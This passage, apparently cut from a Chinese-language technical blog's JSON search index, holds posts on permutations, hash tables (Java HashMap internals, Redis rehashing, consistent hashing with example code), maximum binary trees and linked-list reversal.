class=\"built_in\">len</span>(nums))):</span><br><span class=\"line\">                cycles[i] -= <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> cycles[i] == <span class=\"number\">0</span>:</span><br><span class=\"line\">                    nums[i:] = nums[i + <span class=\"number\">1</span>:] + nums[i:i + <span class=\"number\">1</span>]</span><br><span class=\"line\">                    cycles[i] = <span class=\"built_in\">len</span>(nums) - i</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    j = cycles[i]</span><br><span class=\"line\">                    nums[i], nums[-j] = nums[-j], nums[i]</span><br><span class=\"line\">                    result_nums.append(nums.copy())</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> result_nums</span><br></pre></td></tr></table></figure>\n<p>没看明白</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3>","categories":["算法"],"tags":["算法","全排列"]},{"title":"数据结构-哈希表","url":"/2018/04/11/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%93%88%E5%B8%8C%E8%A1%A8/","content":"<p>哈希表（Hash Table，也叫散列表），是根据关键码值 (Key-Value) 而直接进行访问的数据结构。也就是说，它通过把关键码值映射到表中一个位置来访问记录，以加快查找的速度。</p>\n<p>在Java中HashMap就是使用的哈希表。</p>\n<p>在HashMap中实际存储数据时在一个数组中，在插入时如果放入key，通过<code>(key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16)</code>获取hash，在数据存入table时，通过<code>(n - 1) &amp; hash</code>获取数据应该存入数组下角位置。如果该位置存在数据，在JDK1.8之前是通过一个链表存入，如果重复就会吧数据放入该链表后，在JDK1.8里面是先通过链表存储，如果链表长度超过<code>TREEIFY_THRESHOLD</code>8通过红黑树来存储的数据。在取值时通过比较值来判断获取的key是否是传入当然key。<br>在转换树时，通过判断<code>MIN_TREEIFY_CAPACITY</code>64，超过才会转换为树，为了避免在哈希表建立初期，多个键值对恰好被放入了同一个链表中而导致不必要的转化。</p>\n<p>在插入数据时，如果数据满了，当然不可能每次都放入链表或树中，这样在数据量较多的时候，会严重影响效率。在HashMap中有个扩容因子<code>DEFAULT_LOAD_FACTOR</code>，当插入数据后，数据大于该扩容因子，那么会把数据进行2倍的扩容，在扩容时，如果红黑树的长度小于<code>UNTREEIFY_THRESHOLD</code>6则会退化采用链表，同时把原有的数据重新插入。</p>\n<span id=\"more\"></span>\n<p>理想状态下哈希表的节点中，元素的数量遵守泊松分布。当负载因子为 0.75 时，泊松公式中 λ 约等于 0.5，因此箱子中元素个数和概率的关系如下：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">数量</th>\n<th align=\"center\">概率</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">0</td>\n<td align=\"center\">0.60653066</td>\n</tr>\n<tr>\n<td align=\"center\">1</td>\n<td align=\"center\">0.30326533</td>\n</tr>\n<tr>\n<td align=\"center\">2</td>\n<td align=\"center\">0.07581633</td>\n</tr>\n<tr>\n<td align=\"center\">3</td>\n<td align=\"center\">0.01263606</td>\n</tr>\n<tr>\n<td align=\"center\">4</td>\n<td align=\"center\">0.00157952</td>\n</tr>\n<tr>\n<td align=\"center\">5</td>\n<td align=\"center\">0.00015795</td>\n</tr>\n<tr>\n<td align=\"center\">6</td>\n<td align=\"center\">0.00001316</td>\n</tr>\n<tr>\n<td align=\"center\">7</td>\n<td align=\"center\">0.00000094</td>\n</tr>\n<tr>\n<td align=\"center\">8</td>\n<td align=\"center\">0.00000006</td>\n</tr>\n</tbody></table>\n<p>当数量为8时，概率极低，如果出现数量为8的情况，那么可能是因为hash函数设计导致问题，所以需要避免因为哈希函数导致性能问题，对链表转换为红黑树。</p>\n<p>在插入数据时，获取key的hash需要满足散列结果应当具有同一性（输出值尽量均匀）和雪崩效应（微小的输入值变化使得输出值发生巨大的变化）。这样就能减少出现hash碰撞的情况。</p>\n<p>通过python实现简单版hashmap</p>\n<figure class=\"highlight py\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">HashMap</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 存储数据数组</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.table = [<span class=\"literal\">None</span>] * <span class=\"number\">10</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.size = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"comment\"># 触发扩容临界点</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.threshold = <span class=\"number\">1.5</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># map放入数据</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">put</span>(<span class=\"params\">self, key, val</span>):</span><br><span class=\"line\">        add_node = <span class=\"variable language_\">self</span>.__put_val(<span class=\"variable language_\">self</span>.table, key, val)</span><br><span class=\"line\">        <span class=\"comment\"># 如果是新增节点长度增加，且检查扩容</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> add_node:</span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.size += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.size * <span class=\"variable language_\">self</span>.threshold &gt;= <span class=\"variable language_\">self</span>.threshold * <span class=\"built_in\">len</span>(<span class=\"variable language_\">self</span>.table):</span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.resize()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__put_val</span>(<span class=\"params\">self, table, key, val</span>):</span><br><span class=\"line\">        add_node = <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"comment\"># 获取key对呀节点值</span></span><br><span class=\"line\">        key_hash = <span class=\"variable language_\">self</span>.key_hash(key)</span><br><span class=\"line\">        node = table[key_hash]</span><br><span class=\"line\">        <span class=\"comment\"># 不存在直接插入数组</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> node <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            table[key_hash] = LinkedNode(key_hash, key, val)</span><br><span class=\"line\">            add_node = <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"comment\"># 存在遍历链接</span></span><br><span class=\"line\">            <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">                <span class=\"comment\"># key相同替换</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> node.key == key:</span><br><span class=\"line\">                    node.val = val</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">                <span class=\"comment\"># 不存在key，加入末尾节点</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> node.<span class=\"built_in\">next</span> <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">                    node.<span class=\"built_in\">next</span> = LinkedNode(key_hash, key, val)</span><br><span class=\"line\">                    add_node = <span class=\"literal\">True</span></span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    node = node.<span class=\"built_in\">next</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> add_node</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># key获取值</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">get</span>(<span class=\"params\">self, key</span>):</span><br><span class=\"line\">        key_hash = <span class=\"variable language_\">self</span>.key_hash(key)</span><br><span class=\"line\">        node = <span class=\"variable language_\">self</span>.table[key_hash]</span><br><span class=\"line\">        val = <span class=\"literal\">None</span></span><br><span class=\"line\">        <span class=\"comment\"># 遍历节点</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> node <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">                <span class=\"comment\"># 比较节点key</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> node.key == key:</span><br><span class=\"line\">                    val = node.val</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    node = node.<span class=\"built_in\">next</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> val</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 计算key哈希，只是简单存入数值，直接对数值长度取模</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">key_hash</span>(<span class=\"params\">self, key</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> key % <span class=\"built_in\">len</span>(<span class=\"variable language_\">self</span>.table)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 扩容，直接创建新数组，迁移旧数组到新数组</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">resize</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        new_table = [<span class=\"literal\">None</span>] * <span class=\"built_in\">len</span>(<span class=\"variable language_\">self</span>.table) * <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> node <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.table:</span><br><span class=\"line\">            <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> node <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.__put_val(new_table, node.key, node.val)</span><br><span class=\"line\">                    node = node.<span class=\"built_in\">next</span></span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.table = new_table</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># map节点中存入的节点</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">LinkedNode</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, <span class=\"built_in\">hash</span>, key, val</span>):</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.<span class=\"built_in\">hash</span> = <span class=\"built_in\">hash</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.key = key</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.val = val</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.<span class=\"built_in\">next</span> = <span class=\"literal\">None</span></span><br></pre></td></tr></table></figure>\n<p>上述只是简单实现，在计算hash时直接通过取模来获取。</p>\n<p>上述使用hashmap有个缺点在于，如果数据量非常大，那么每次扩容迁移数据都得花费不少时间，因为要把旧数据迁移到新的数组中。</p>\n<h3 id=\"redis-hash扩容\"><a href=\"#redis-hash扩容\" class=\"headerlink\" title=\"redis hash扩容\"></a>redis hash扩容</h3><p>在上述扩容过程中比较慢，特别是数据量大时，但是在redis中hash扩容采用了另外一种机制。</p>\n<p>在redis中时间存储简单理解为：redis中存储有两个数组，数组ht[0]，存储原本的数据，数组ht[1]用于扩容，同时有个字段<code>rehashidx</code>用来标识扩容进度。扩容如下：<br>1、先创建一个比ht[0]更大的table ht[1]<br>2、将ht[0]中的数据一步步迁移到ht[1]中<br>3、迁移完毕后，将ht[0]中数据清除，释放内存，将ht[1]替换为ht[0]</p>\n<p>在扩容过程中，并不是一次性完成。避免因为服务器阻塞导致性能下降<br>1、_dictRehashStep被动迁移，一般是在插入、查找、删除都会触发执行，避免在一次操作中执行<br>2、dictRehashMilliseconds，服务器常规任务程序（server cron job）执行</p>\n<p>在迁移过程中，查找、删除会在ht[0]、ht[1]中进行，新增只会在ht[1]中进行，这样保证了ht[0]只减不增。</p>\n<p>除了扩容，还是缩容，操作与上述类型，创建一个小的table然后进行迁移。</p>\n<ul>\n<li>在redis扩容过程中，链表迁移时，会把数据放到链表前面，这样的好处是，插入较快，而且新插入的数据可能会频繁的获取。</li>\n</ul>\n<p>上述hash表的实现使用的拉链发，也就是出现hash碰撞时，使用链表存储相同hash的数据。<br>实际上除了拉链法，还有开放地址散列法，开放地址散列法中包括：线性散列、二次散列等，其实就是单出现hash碰撞时，如果当前位置已经存在值，那么就放入下一个节点。</p>\n<h3 id=\"动态hash\"><a href=\"#动态hash\" class=\"headerlink\" title=\"动态hash\"></a>动态hash</h3><p>主要是为了解决规模扩展的问题，主体思路是在数据规模变大后，映射的范围将翻倍，新数据的插入将按照最新的映射范围插入</p>\n<h3 id=\"hash一致\"><a href=\"#hash一致\" class=\"headerlink\" title=\"hash一致\"></a>hash一致</h3><p>主要是为了解决分布式系统如何扩展的问题，主体思路是保证数据分布的均匀性和单调性。</p>\n<p>在分布式调用不同服务器时，通过取hash来判断应该定位到哪台服务器，或者在mysql数据库做迁移时，确定数据迁移到了哪台服务器，如果后期服务器增加，使用普通hash取模计算，会到手所有数据都要做迁移。<br>使用hash一致算法就可以减少迁移的数量。<br>示例如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 一致hash不带虚拟节点</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">UniformityHassNotVirtualNode</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//有序Map，因为一致hash是一个环，需要通过顺序寻找到指定的节点</span></span><br><span class=\"line\">    <span class=\"keyword\">static</span> TreeMap&lt;Integer, String&gt; dbMap = <span class=\"keyword\">new</span> <span class=\"title class_\">TreeMap</span>&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">db</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;192.168.0.1:3306&quot;</span>;</span><br><span class=\"line\">        addNode(db);</span><br><span class=\"line\">        db = <span class=\"string\">&quot;192.168.0.2:3306&quot;</span>;</span><br><span class=\"line\">        addNode(db);</span><br><span class=\"line\">        db = <span class=\"string\">&quot;192.168.0.3:3306&quot;</span>;</span><br><span class=\"line\">        addNode(db);</span><br><span class=\"line\">        db = <span class=\"string\">&quot;192.168.0.4:3306&quot;</span>;</span><br><span class=\"line\">        addNode(db);</span><br><span class=\"line\">        db = <span class=\"string\">&quot;192.168.0.5:3306&quot;</span>;</span><br><span class=\"line\">        addNode(db);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">addNode</span><span class=\"params\">(String db)</span> &#123;</span><br><span class=\"line\">        dbMap.put(strHash(db), db);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">removeNode</span><span class=\"params\">(String db)</span> &#123;</span><br><span class=\"line\">        dbMap.remove(strHash(db));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//使用FNV1_32_HASH算法计算Hash值</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">strHash</span><span class=\"params\">(String str)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">p</span> <span class=\"operator\">=</span> <span class=\"number\">16777619</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">hash</span> <span class=\"operator\">=</span> (<span class=\"type\">int</span>) <span class=\"number\">2166136261L</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; str.length(); i++)</span><br><span class=\"line\">            hash = (hash ^ str.charAt(i)) * p;</span><br><span class=\"line\">        hash += hash &lt;&lt; <span class=\"number\">13</span>;</span><br><span class=\"line\">        hash ^= hash &gt;&gt; <span class=\"number\">7</span>;</span><br><span class=\"line\">        hash += hash &lt;&lt; <span class=\"number\">3</span>;</span><br><span class=\"line\">        hash ^= hash &gt;&gt; <span class=\"number\">17</span>;</span><br><span class=\"line\">        hash += hash &lt;&lt; <span class=\"number\">5</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 如果算出来的值为负数则取其绝对值</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (hash &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">            hash = Math.abs(hash);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> hash;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title function_\">findDb</span><span class=\"params\">(String key)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">hash</span> <span class=\"operator\">=</span> strHash(key);</span><br><span class=\"line\">        <span class=\"comment\">//通过ceilingKey获取大于等于给定键的最小键</span></span><br><span class=\"line\">        <span class=\"type\">Integer</span> <span class=\"variable\">nodeKey</span> <span class=\"operator\">=</span> dbMap.ceilingKey(hash);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> nodeKey == <span class=\"literal\">null</span> ? dbMap.firstEntry().getValue() : dbMap.get(nodeKey);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Map&lt;String, String&gt; storeNos = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        IntStream.range(<span class=\"number\">1000</span>, <span class=\"number\">1050</span>).forEach((i) -&gt; storeNos.put(String.valueOf(i), UniformityHassNotVirtualNode.findDb(String.valueOf(i))));</span><br><span class=\"line\">        storeNos.forEach((key, val) -&gt; System.out.printf(<span class=\"string\">&quot;key: %s db: %s \\n&quot;</span>, key, val));</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">db</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;192.168.0.8:3306&quot;</span>;</span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;新增节点 %s \\n&quot;</span>, db);</span><br><span class=\"line\">        UniformityHassNotVirtualNode.addNode(db);</span><br><span class=\"line\">        printNode();</span><br><span class=\"line\">        db = <span class=\"string\">&quot;192.168.0.4:3306&quot;</span>;</span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;删除节点 %s \\n&quot;</span>, db);</span><br><span class=\"line\">        UniformityHassNotVirtualNode.removeNode(db);</span><br><span class=\"line\">        printNode();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">printNode</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        storeNos.forEach((key, val) -&gt; &#123;</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">findDb</span> <span class=\"operator\">=</span> UniformityHassNotVirtualNode.findDb(key);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (findDb.equals(val)) &#123;</span><br><span class=\"line\">                System.out.printf(<span class=\"string\">&quot;key: %s db: %s 未发生变化\\n&quot;</span>, key, val);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                System.out.printf(<span class=\"string\">&quot;key: %s db: %s 发生迁移，原来节点：%s\\n&quot;</span>, key, findDb, val);</span><br><span class=\"line\">                storeNos.put(key, findDb);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上述中通过hash找到对应的数据库地址。<br>具体hash解释以及图像参考：</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veHJxNzMwL3AvNTE4NjcyOC5odG1s\">对一致性Hash算法，Java代码实现的深入研究<i class=\"fa fa-external-link-alt\"></i></span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC83OTNjNzZlZTg0ZmM=\">一致性哈希算法在分布式缓存中的应用<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n<p>在使用上述一致hash时，因为节点较少，所有可能会出现大量数据集中在某一个节点，这时可以引入虚拟节点。<br>代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//修改新增节点，每个实际节点新增100个虚拟节点</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">addNode</span><span class=\"params\">(String db)</span> &#123;</span><br><span class=\"line\">    IntStream.range(<span class=\"number\">0</span>, <span class=\"number\">100</span>).forEach((i)-&gt;&#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">virtualNode</span> <span class=\"operator\">=</span> db + <span class=\"string\">&quot;#&quot;</span> + i;</span><br><span class=\"line\">        dbMap.put(strHash(virtualNode), virtualNode);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//修改删除节点，删除实际节点同时还要删除虚拟节点</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">removeNode</span><span class=\"params\">(String db)</span> &#123;</span><br><span class=\"line\">    dbMap.entrySet().removeIf(next -&gt; next.getValue().startsWith(db));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用虚拟节点后就很少存在某个节点存在大量的数据了。</p>\n<p>参考：</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iZXN0c3dpZnRlci5jb20vaGFzaHRhYmxlLw==\">深入理解哈希表<i class=\"fa fa-external-link-alt\"></i></span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL29yaWdpbi5yZWRpc2Jvb2suY29tL2ludGVybmFsLWRhdGFzdHJ1Y3QvZGljdC5odG1s\">字典<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n","categories":["数据结构"],"tags":["哈希表","Hash一致"]},{"title":"算法-树","url":"/2018/04/11/%E7%AE%97%E6%B3%95-%E6%A0%91/","content":"<h3 id=\"最大二叉树\"><a href=\"#最大二叉树\" class=\"headerlink\" title=\"最大二叉树\"></a>最大二叉树</h3><p>给定一个不含重复元素的整数数组。一个以此数组构建的最大二叉树定义如下：</p>\n<p>二叉树的根是数组中的最大元素。<br>左子树是通过数组中最大值左边部分构造出的最大二叉树。<br>右子树是通过数组中最大值右边部分构造出的最大二叉树。<br>通过给定的数组构建最大二叉树，并且输出这个树的根节点。</p>\n<span id=\"more\"></span>\n<figure class=\"highlight py\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TreeNode</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, x</span>):</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.val = x</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.left = <span class=\"literal\">None</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.right = <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Solution</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">constructMaximumBinaryTree</span>(<span class=\"params\">self, nums</span>):</span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">        :type nums: List[int]</span></span><br><span class=\"line\"><span class=\"string\">        :rtype: TreeNode</span></span><br><span class=\"line\"><span class=\"string\">        &quot;&quot;&quot;</span></span><br><span class=\"line\">        max_num = nums[<span class=\"number\">0</span>]</span><br><span class=\"line\">        head = TreeNode(max_num)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"built_in\">len</span>(nums)):</span><br><span class=\"line\">            node = TreeNode(nums[i])</span><br><span class=\"line\">            <span class=\"keyword\">if</span> node.val &gt; head.val:</span><br><span class=\"line\">                node.left = head</span><br><span class=\"line\">                head = node</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.add_child_node(head, node)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> head</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">add_child_node</span>(<span class=\"params\">self, top, node</span>):</span><br><span class=\"line\">        right = top.right</span><br><span class=\"line\">        <span class=\"keyword\">if</span> top.right <span class=\"keyword\">is</span> <span class=\"literal\">None</span> <span class=\"keyword\">or</span> top.right.val &lt; node.val:</span><br><span class=\"line\">            top.right = node</span><br><span class=\"line\">            node.left = right</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.add_child_node(right, node)</span><br></pre></td></tr></table></figure>\n<p>分析原理：<br>数组从左开始遍历，从head树开始判断<br>如果数组大于head树，表示当前为最大值，那么设置head为当前值，且当前值的左边为原树，因为<code>左子树是通过数组中最大值左边部分构造出的最大二叉树。</code><br>如果小于head树，递归调用head 右树，如果大于该节点，那么原节点下降，当前节点补上该节点，原下降节点设置为当前节点左树<code>左子树是通过数组中最大值左边部分构造出的最大二叉树。</code>。如果小于该节点，那么一直从右节点向下查找，直到满足条件。</p>\n","categories":["算法"],"tags":["二叉树"]},{"title":"算法-链表翻转","url":"/2018/04/11/%E7%AE%97%E6%B3%95-%E9%93%BE%E8%A1%A8%E7%BF%BB%E8%BD%AC/","content":"<p>反转一个单链表。</p>\n<span id=\"more\"></span>\n<p>简单直白方法：</p>\n<figure class=\"highlight py\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ListNode</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, x</span>):</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.val = x</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.<span class=\"built_in\">next</span> = <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Solution</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">reverseList</span>(<span class=\"params\">self, head</span>):</span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">        :type head: ListNode</span></span><br><span class=\"line\"><span class=\"string\">        :rtype: ListNode</span></span><br><span class=\"line\"><span class=\"string\">        &quot;&quot;&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> head <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> head</span><br><span class=\"line\">        first = <span class=\"literal\">None</span></span><br><span class=\"line\">        second = head</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            third = second.<span class=\"built_in\">next</span></span><br><span class=\"line\">            second.<span class=\"built_in\">next</span> = first</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> third <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">            first = second</span><br><span class=\"line\">            second = third</span><br><span class=\"line\">        <span class=\"keyword\">return</span> second</span><br></pre></td></tr></table></figure>\n\n<p>大神快速方法：</p>\n<figure class=\"highlight py\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ListNode</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, x</span>):</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.val = x</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.<span class=\"built_in\">next</span> = <span 